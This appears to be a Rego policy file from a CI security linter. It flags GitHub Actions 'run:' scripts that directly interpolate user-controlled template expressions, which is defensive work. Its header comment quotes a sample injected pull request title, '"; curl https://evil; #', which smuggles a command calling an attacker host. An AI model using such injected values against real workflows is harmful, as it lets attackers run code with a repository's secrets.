# template-injection — flag inline `run:` scripts that interpolate
# user-controlled GitHub template expressions directly into the shell
# command. The canonical attacker scenario: a pull request opens with
# a crafted title like `"; curl https://evil; #` and the workflow
# pastes it verbatim into a shell one-liner. Under a privileged
# trigger (`pull_request_target`, `workflow_run`, …) the attacker ends
# up executing arbitrary code with the repo's secrets.
#
# Severity is "critical" for the same reasons as dangerous-triggers
# (ISSUE-414): this is the pattern behind the March 2025
# tj-actions/changed-files supply-chain compromise
# (CVE-2025-30066). The safe way to use such values is via an env:
# binding, then dereferencing the environment variable ("$TITLE"),
# which shell-escapes the value. This policy flags only direct
# interpolation inside `run:`, so the env-binding pattern remains
# quiet.
package template_injection

import rego.v1

# Regex patterns matching template expressions whose value is under
# the control of an unprivileged PR author. Additional patterns can
# be added here as the check evolves; the shared message keeps the
# output simple regardless of which pattern matched.
unsafe_patterns := [
	`\${{\s*github\.event\.`,
	`\${{\s*github\.head_ref\s*}}`,
]

deny contains finding if {
	some i, j, k
	job := input.pipeline.jobs[i]
	script := job.scripts[j]
	pattern := unsafe_patterns[k]
	regex.match(pattern, script)
	finding := {
		"code":     "ISSUE-206",
		"severity": "critical",
		"message":  sprintf("job %q interpolates a user-controlled template expression into an inline script (template-injection risk)", [job.name]),
		"job":      job.name,
	}
}
